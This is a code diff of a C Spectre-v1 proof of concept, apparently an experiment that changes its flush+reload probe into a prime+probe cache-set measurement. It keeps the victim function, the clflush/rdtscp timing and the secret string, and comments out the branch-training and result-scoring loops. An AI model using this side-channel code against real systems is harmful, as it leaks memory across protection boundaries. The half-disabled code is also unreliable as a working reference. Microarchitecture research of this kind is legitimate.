@@ -8,11 +8,11 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-#define DIST 256 // 64 * 4 for preventing prefetching
-#define SET 128 //16 * ways 
+#define DIST 64 // 64 * 4 for preventing prefetching
+#define INDICES 64 // 16 * ways
 #define WAY 8
 #define LINE 64
-#define INDICES 16
+#define SET 64 
 
 /********************************************************************
 Victim code.
@@ -38,7 +38,8 @@ uint8_t array1[160] = {
   16
 };
 uint8_t unused2[64];
-uint8_t array2[SET * DIST];
+uint8_t array2[WAY * SET * LINE]; // for prime
+uint8_t array3[WAY * SET * LINE]; // for eviction
 
 char * secret = "The Magic Words are Squeamish Ossifrage.";
 
@@ -46,7 +47,7 @@ uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
 void victim_function(size_t x) {
   if (x < array1_size) {
-    temp &= array2[array1[x] * DIST];
+    temp &= array3[array1[x] * DIST];
   }
 }
 
@@ -58,70 +59,86 @@ Analysis code
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
-  static int results[INDICES];
+  static int results[WAY * INDICES];
   int tries, i, j, k, mix_i, junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
-  for (i = 0; i < SET; i++)
+  for (i = 0; i < INDICES; i++)
     results[i] = 0;
-  for (tries = 9; tries > 0; tries--) {
 
+  for (tries = 9; tries > 0; tries--) {
+	printf("try %d\n",tries);
     /* Flush array2[256*(0..255)] from cache */
-    for (i = 0; i < SET; i++)
-      _mm_clflush( & array2[i * DIST]); /* intrinsic for clflush instruction */
+    for (i = 0; i < WAY; i++){
+	  for (j = 0; j < INDICES ; j++) {
+        _mm_clflush( & array2[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
+	  }
+	}
 
 	// prime data over cache
 	//printf("priming...\n");
-	for( i=0;i<SET;i++) {
-      	//mix_i = ((i * 167) + 13) & (SET-1);
-		mix_i = i;
-		time1 = __rdtscp(&junk);
-		temp&= array2[mix_i * DIST];
-		time2 = __rdtscp(&junk) - time1;
-	  	//printf("%03d : 0x%02X's access time is %d\n",i,mix_i,time2);
+	for( i=0;i < WAY - 0;i++) {
+		for( j = 0; j < INDICES; j++) {
+			temp&= array2[(i * INDICES + j) * DIST];
+		}
 	}
 
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-    training_x = tries % array1_size;
+    /*training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
       _mm_clflush( & array1_size);
-      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+      for (volatile int z = 0; z < 100; z++) {} //* Delay (can also mfence) /
 
-      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-      /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+      //* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 /
+      //* Avoid jumps in case those tip off the branch predictor /
+      x = ((j % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
+      x = (x | (x >> 16)); //* Set x=-1 if j&6=0, else x=0 /
       x = training_x ^ (x & (malicious_x ^ training_x));
 
-      /* Call the victim! */
+      //* Call the victim! /
       victim_function(x);
 
-    }
+    }*/
 	
-	printf("probing...\n");
+	//printf("probing...\n");
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
-    for (i = 0; i < SET; i++) {
-      mix_i = ((i * 167) + 13) & (SET-1);
-	  //mix_i = i;
-      addr = & array2[mix_i * DIST];
-      time1 = __rdtscp( & junk); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-	  printf("%03d : 0x%02X's access time is %d : ",i,mix_i,time2);
-	  if(time2 <= L1_CACHE_HIT_THRESHOLD ){
-		  printf("hit\n");
-	  } else {
-		  printf("miss\n");
-	  }
-      if (time2 >= L1_CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-        results[mix_i%INDICES]++; /* cache miss - add +1 to score for this value */
+    for (i = 0; i < WAY; i++) {
+		for ( j = 0; j < INDICES ; j++) {
+	      	addr = & array2[(i * INDICES + j) * DIST];
+    	  	time1 = __rdtscp( & junk); /* READ TIMER */
+      		junk = * addr; /* MEMORY ACCESS TO TIME */
+      		time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+	  		/*printf("%03d : 0x%02X's access time is %d : ",i,mix_i,time2);
+	  		if(time2 <= L1_CACHE_HIT_THRESHOLD ){
+				  printf("hit\n");
+	  		} else {
+				  printf("miss\n");
+			}*/
+			results[i * INDICES + j] = time2;
+      		/*if (time2 >= L1_CACHE_HIT_THRESHOLD && i != array1[tries % array1_size])
+        		results[i % INDICES]++; //* cache miss - add +1 to score for this value */
+		}
     }
 
+	for (i = 0; i< WAY ; i++){
+		printf("way %d\n",i);
+		for (j = 0; j < INDICES; j++){
+      		addr = & array2[(i * INDICES + j) * DIST];
+			time2 = results[i * INDICES + j];
+			printf("ind %02d, address %p, time %ld",j, addr, time2);
+			if (time2 > L1_CACHE_HIT_THRESHOLD){
+				printf(" miss\n");
+			} else {
+				printf(" hit\n");
+			}
+
+		}
+	}
     /* Locate highest & second-highest results results tallies in j/k */
-    j = k = -1;
+    /*j = k = -1;
     for (i = 0; i < INDICES; i++) {
       if (j < 0 || results[i] >= results[j]) {
         k = j;
@@ -146,8 +163,8 @@ int main(int argc,
   int i, score[2], len = 40;
   uint8_t value[2];
 
-  for (i = 0; i < sizeof(array2); i++)
-    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+  for (i = 0; i < sizeof(array3); i++)
+    array3[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   if (argc == 3) {
     sscanf(argv[1], "%p", (void * * )( & malicious_x));
     malicious_x -= (size_t) array1; /* Convert input value into a pointer */
